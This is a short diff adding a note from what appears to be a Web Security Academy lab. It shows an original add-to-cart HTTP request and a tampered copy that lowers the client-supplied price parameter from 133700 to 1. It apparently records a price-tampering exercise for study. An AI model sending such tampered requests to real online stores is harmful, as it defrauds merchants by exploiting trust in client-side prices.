@@ -1,0 +1,13 @@
+Original add-to-cart request:
+POST /cart HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+productId=1&redir=PRODUCT&quantity=1&price=133700
+
+Tampered request:
+POST /cart HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+productId=1&redir=PRODUCT&quantity=1&price=1
